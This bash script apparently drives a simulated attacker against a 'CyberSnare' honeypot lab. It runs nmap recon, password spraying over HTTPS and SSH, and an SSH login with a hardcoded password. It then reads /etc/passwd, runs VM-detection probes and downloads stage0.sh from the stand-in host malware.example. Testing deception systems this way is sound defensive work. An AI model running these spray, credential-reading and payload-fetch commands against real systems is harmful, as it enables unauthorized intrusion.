#!/usr/bin/env bash
# Runs INSIDE cs-attacker. Automated recon → spray → L2 probes → BURN wait.
set -u

TARGET="${CS_TARGET:-10.200.2.10}"
SSH_PORT="${CS_SSH_PORT:-2222}"
HTTPS_PORT="${CS_HTTPS_PORT:-8443}"
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o BatchMode=yes"

echo "============================================================"
echo " CyberSnare Kali auto-recon  target=${TARGET}"
echo "============================================================"

echo
echo "== 1. RECON (L1 attract) =="
nmap --unprivileged -Pn -n -p "${SSH_PORT},${HTTPS_PORT}" "$TARGET" || true
echo "-- HTTPS portal --"
curl -sk --max-time 8 "https://${TARGET}:${HTTPS_PORT}/" | head -c 400 || true
echo
echo "-- SSH banner --"
(echo | nc -w 3 "$TARGET" "$SSH_PORT") || true
ssh $SSH_OPTS -p "$SSH_PORT" "probe@${TARGET}" true 2>&1 || true

echo
echo "== 2. CREDENTIAL SPRAY =="
for i in 1 2 3 4 5 6 7 8; do
  curl -sk --max-time 5 -o /dev/null -w "login %{http_code}\n" \
    -X POST "https://${TARGET}:${HTTPS_PORT}/login" \
    -d "username=admin&password=wrong${i}" || true
  ssh $SSH_OPTS -p "$SSH_PORT" "user${i}@${TARGET}" true 2>&1 | tail -1 || true
done

echo
echo "== 3. WAIT FOR L2 (auth open) =="
OPEN=0
for n in $(seq 1 40); do
  if sshpass -p 'nexus2024' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=4 -p "$SSH_PORT" "guest@${TARGET}" 'whoami' 2>/dev/null | grep -q guest; then
    echo "L2 open after ${n}s — guest shell accepted"
    OPEN=1
    break
  fi
  printf '.'
  sleep 2
done
echo
if [ "$OPEN" != 1 ]; then
  echo "L2 not open yet — host should pin L2 (./cs set-level L2). Retrying 20s..."
  sleep 20
  if sshpass -p 'nexus2024' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=4 -p "$SSH_PORT" "guest@${TARGET}" 'whoami' 2>/dev/null | grep -q guest; then
    OPEN=1
    echo "L2 open"
  fi
fi

if [ "$OPEN" = 1 ]; then
  echo
  echo "== 4. ENGAGE + VM/SANDBOX PROBES (raises suspicion → BURN) =="
  sshpass -p 'nexus2024' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o ConnectTimeout=8 -p "$SSH_PORT" "guest@${TARGET}" \
    'whoami; hostname; ls; cat /etc/passwd; cat /proc/cpuinfo; systemd-detect-virt; virt-what; cat /proc/1/cgroup; dmesg; lscpu' \
    2>/dev/null || true
  # Extra probes so suspicion >= 0.75 (each vm_check adds 0.25)
  for probe in 'cat /proc/version' 'cat /proc/cpuinfo' 'dmesg' 'lscpu'; do
    sshpass -p 'nexus2024' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      -o ConnectTimeout=5 -p "$SSH_PORT" "guest@${TARGET}" "$probe" >/dev/null 2>&1 || true
    sleep 1
  done
else
  echo "Skipping engage — SSH still closed. Host will pin BURN as fallback."
fi

echo
echo "== 5. WAIT FOR BURN (SSH/HTTPS freeze) =="
for n in $(seq 1 8); do
  CODE=$(curl -sk --max-time 3 -o /dev/null -w '%{http_code}' "https://${TARGET}:${HTTPS_PORT}/" || echo 000)
  if [ "$CODE" = "000" ]; then
    echo "HTTPS gone — likely BURN"
    break
  fi
  sleep 1
done

echo
echo "== 6. SINKHOLE still reachable from this Kali (egress net) =="
echo "DNS malware.example:"
getent hosts malware.example || true
echo "Fetch stage0 (should print sinkholed):"
curl -s --max-time 5 http://malware.example/stage0.sh || curl -s --max-time 5 http://malware.example/payload.sh || true
echo

echo "============================================================"
echo " Auto phase done. Stay in this container and run:"
echo "   curl -v http://malware.example/stage0.sh"
echo "   nmap -Pn -p 2222,8443 ${TARGET}"
echo " Host login:  ssh -p 2220 kali@127.0.0.1   password: kali"
echo "============================================================"
